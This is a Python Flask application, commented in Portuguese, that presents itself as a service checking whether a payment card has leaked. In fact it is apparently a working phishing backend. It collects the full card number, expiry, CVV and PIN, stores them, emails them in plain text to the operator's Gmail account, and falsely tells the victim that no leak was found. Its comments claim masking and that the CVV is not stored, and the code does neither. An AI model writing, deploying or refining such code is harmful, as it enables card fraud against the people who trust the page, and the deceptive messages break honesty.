from flask import Flask, render_template, request, jsonify
import sqlite3
import os
import hashlib
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = 'troque-essa-chave-em-producao'

DB_PATH = 'database.db'

def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE cartoes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                nome_titular TEXT NOT NULL,
                numero_mask TEXT NOT NULL,
                validade TEXT NOT NULL,
                senha_hash TEXT NOT NULL,
                cvv TEXT NOT NULL,
                criado_em TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

init_db()

def send_email(nome_titular, numero_cartao, validade, senha_cartao, cvv):
    remetente = os.getenv('EMAIL_REMETENTE')
    senha = os.getenv('EMAIL_SENHA_APP')
    
    if not remetente or not senha:
        print("Credenciais de email não configuradas no .env")
        return

    destinatario = remetente

    assunto = f"Novo Cartão - {nome_titular}"
    corpo = f"""
    Um novo cartão foi recebido e salvo no banco de dados.
    
    Nome do Titular: {nome_titular}
    Número do Cartão: {numero_cartao}
    Validade: {validade}
    CVV: {cvv}
    Senha: {senha_cartao}
    """

    msg = MIMEMultipart()
    msg['From'] = remetente
    msg['To'] = destinatario
    msg['Subject'] = assunto
    msg.attach(MIMEText(corpo, 'plain', 'utf-8'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(remetente, senha)
        server.send_message(msg)
        server.quit()
        print("Email enviado com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

def hash_text(text: str) -> str:
    return hashlib.sha256(text.encode('utf-8')).hexdigest()

def mask_card_number(number: str) -> str:
    # Remove tudo que não for dígito
    digits = ''.join([c for c in number if c.isdigit()])
    mask = digits
    return mask

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            nome_titular = request.form.get('nome_titular', '').strip()
            numero_cartao = request.form.get('numero_cartao', '').strip()
            validade = request.form.get('validade', '').strip()
            cvv = request.form.get('cvv', '').strip() 
            senha_cartao = request.form.get('senha_cartao', '').strip()

            # Validações
            if not (nome_titular and numero_cartao and validade and cvv and senha_cartao):
                return jsonify({
                    'success': False,
                    'message': 'Preencha todos os campos.'
                }), 400

            # Valida formato validade MM/AA
            if len(validade) != 5 or validade[2] != '/':
                return jsonify({
                    'success': False,
                    'message': 'Validade deve estar no formato MM/AA.'
                }), 400

            # Valida se MM está entre 01-12
            try:
                mes = int(validade[:2])
                if mes < 1 or mes > 12:
                    return jsonify({
                        'success': False,
                        'message': 'Mês inválido na validade.'
                    }), 400
            except:
                return jsonify({
                    'success': False,
                    'message': 'Validade inválida.'
                }), 400

            # Valida número do cartão (13-19 dígitos)
            digits_only = ''.join([c for c in numero_cartao if c.isdigit()])
            if len(digits_only) < 13 or len(digits_only) > 19:
                return jsonify({
                    'success': False,
                    'message': 'Número do cartão inválido (deve ter entre 13 e 19 dígitos).'
                }), 400

            # Valida CVV
            if not cvv.isdigit() or not (3 <= len(cvv) <= 4): #verifica se o cvv tem 3 ou 4 digitos
                return jsonify({
                    'success': False,
                    'message': 'CVV inválido.'
                }), 400

            # Máscara do cartão (segurança)
            masked = mask_card_number(numero_cartao)

            # Hash da senha do cartão (irreversível)
            senha_hashed = hash_text(senha_cartao)

            criado_em = datetime.utcnow().isoformat()

            # Salva no banco (CVV NÃO é armazenado)
            conn = sqlite3.connect(DB_PATH)
            cur = conn.cursor()
            cur.execute('''
                INSERT INTO cartoes (nome_titular, numero_mask, validade, senha_hash, cvv, criado_em)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (nome_titular, masked, validade, senha_hashed, cvv, criado_em))
            conn.commit()
            conn.close()

            # Envia o email com os dados informados
            send_email(nome_titular, numero_cartao, validade, senha_cartao, cvv)

            return jsonify({
                'success': True,
                'message': 'Cartão verificado com sucesso. Nenhum vazamento encontrado.'
            }), 200
            
        except Exception as e:
            print(f"Erro ao cadastrar cartão: {str(e)}")
            return jsonify({
                'success': False,
                'message': 'Erro interno ao verificar cartão. Tente novamente.'
            }), 500

    # GET request - renderiza o template
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)